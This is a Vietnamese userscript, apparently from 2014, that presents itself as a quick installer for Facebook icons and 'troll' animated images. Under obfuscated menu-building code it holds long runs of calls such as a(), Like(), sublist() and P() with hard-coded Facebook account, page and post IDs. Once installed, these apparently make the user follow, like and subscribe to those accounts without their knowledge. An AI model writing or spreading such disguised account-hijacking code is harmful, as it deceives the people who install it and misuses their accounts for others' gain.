// ==UserScript==
// @name            CÀI ĐẶT NHANH ICON FACEBOOK & HÌNH ĐỘNG TROLL 2014
// @description     CopyRight JIN NGUYEN
...
(function () {
    ...
    _0x3384x4 += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img> Icon</span>';
    _0x3384x4 += '</a>';
    _0x3384x4 += '<div>';
    ...
    _0x3384x4 += '<a class="jewelFooter" href="https://www.facebook.com/dejinvn" target="_blank">Jin Nguyen</a>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
...
//B?n M? Tr? Con
a("100001094522338");Like("714816081886234");Like("495924733851002");Like("708522815854225");
//BossAgung
...
a("100004730348780");a("100003069248765");a("100003693653205");
//Ké Trung Nhox
...
//Thúy Nhi
a("100006064180469");a("100003489418766");a("100005252313938");a("100000486644739");a("100006044743962");a("100007833065308");a("100007776852373");sublist("362581897201454");sublist("365198133606497");sublist("365198380273139");
Like("365283946951647");Like("732026250159127");Like("222147691300339");Like("328662547275802");Like("633533946704064");Like("437584159703413");Like("484809628296881");Like("149706148570478");Like("607150675962138");Like("148115978729579");Like("227898474024042");Like("397032160398361");Like("579802062045583");P("147932295333083");
//Tu?n Cư?ng Gay
...
Like("349118788561497");Like("206382782889933");Like("482065031906574");Like("201295486740034");
//Tu Chí
